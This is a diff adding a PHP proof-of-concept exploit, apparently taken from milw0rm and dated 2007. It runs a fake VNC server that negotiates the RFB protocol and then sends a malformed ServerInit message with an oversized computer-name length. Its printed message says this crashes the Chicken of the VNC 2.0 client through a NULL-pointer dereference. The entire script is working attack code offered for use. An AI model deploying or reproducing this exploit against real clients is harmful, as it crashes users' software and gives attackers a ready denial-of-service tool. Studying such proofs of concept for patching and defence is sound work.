@@ -1,0 +1,52 @@
+<?
+$port = "5900";
+
+$BadServerInit=
+"\x04\x00".                                     // fb-width
+"\x03\x00".                                     // fb-hight
+"\x20".                                         // bits per pixel
+"\x18".                                         // depth
+"\x00".                                         // big-endian flag
+"\x01".                                         // true-color flag
+"\x00\xff\x00\xff\x00\xff". 			// r-g-b max
+"\x10\x08\x00".                         	// r-g-b shift
+"\x00\x00\x00".                         	// padding
+"\xff\xff\xff\xff".                     	// computer-name size
+"DIE_PLZ";                                      // computer-name
+
+
+$ser = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);
+socket_set_option($ser,SOL_SOCKET,SO_REUSEADDR,1);
+socket_bind($ser,"0.0.0.0", $port);
+
+socket_listen($ser, 5);
+
+print "this fake vnc server will crash cotv2.0 (http://sourceforge.net/projects/cotvnc/) due to a NULL-pointer dereference 02-02-2007   poplix [@] papuasia.org listening on $port ...\n";
+
+$cotv = socket_accept($ser);
+print "client connected\n";
+
+socket_write($cotv, "RFB 00 3.008\n");
+while($i=socket_read($cotv, 1024))
+       if(substr($i,0,6) == "RFB 00") break;
+
+
+print "protocol has been negotiated\n";
+
+socket_write($cotv, "\x00\x00\x00\x01");
+while($i=socket_read($cotv, 1024))
+       if(ord($i[0])==0 || ord($i[0])==1)break;
+
+print "sending expl...\n";
+
+socket_write($cotv, $BadServerInit);
+
+
+socket_close($cotv);
+
+socket_close($ser);
+
+print "done\n";
+?>
+
+# milw0rm.com [2007-02-02]
